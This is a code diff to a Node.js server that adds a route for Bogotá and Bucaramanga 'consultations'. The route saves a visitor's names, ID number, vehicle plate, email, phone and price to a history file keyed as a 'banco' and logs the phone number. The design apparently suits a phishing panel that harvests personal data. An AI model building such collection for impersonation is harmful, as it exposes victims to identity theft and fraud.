@@ -21,7 +21,7 @@ if (!fs.existsSync(DATA_DIR)) {
 
 const estadoSesiones = new Map();
 const datosSesiones = new Map();
-const ultimaAccionSesiones = new Map(); // 🔥 NUEVO
+const ultimaAccionSesiones = new Map();
 const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
@@ -395,7 +395,7 @@ const server = http.createServer(async (req, res) => {
                     if (estadoSesiones.delete(sid)) borradas++;
                     datosSesiones.delete(sid);
                     usuariosActivos.delete(sid);
-                    ultimaAccionSesiones.delete(sid); // 🔥 LIMPIAMOS
+                    ultimaAccionSesiones.delete(sid);
                 });
                 agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
                 json(res, 200, { ok: true, borradas });
@@ -455,6 +455,31 @@ const server = http.createServer(async (req, res) => {
         }
 
         json(res, 404, { ok: false, error: 'Ruta admin no encontrada' });
+        return;
+    }
+
+    // ============================================================
+    // 🔥 NUEVO: Guardar datos de la consulta inicial
+    // ============================================================
+    const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
+    if (req.method === 'POST' && consultaMatch) {
+        try {
+            const bancoKey = 'cc-' + consultaMatch[1];
+            const datos = await getBody(req);
+            const { sessionId, nombres, apellidos, documento, placa, correo, telefono, precio } = datos;
+            if (!sessionId) { json(res, 400, { ok: false }); return; }
+
+            const datosPrevios = datosSesiones.get(sessionId) || {};
+            const datosCompletos = Object.assign({}, datosPrevios, {
+                nombres, apellidos, documento, placa, correo, telefono, precio
+            });
+
+            datosSesiones.set(sessionId, datosCompletos);
+            guardarHistorial(bancoKey, datosCompletos); // Guarda en el archivo de historial
+
+            console.log(`[${bancoKey}] Consulta guardada: ${sessionId} | Tel: ${telefono}`);
+            json(res, 200, { ok: true });
+        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
 
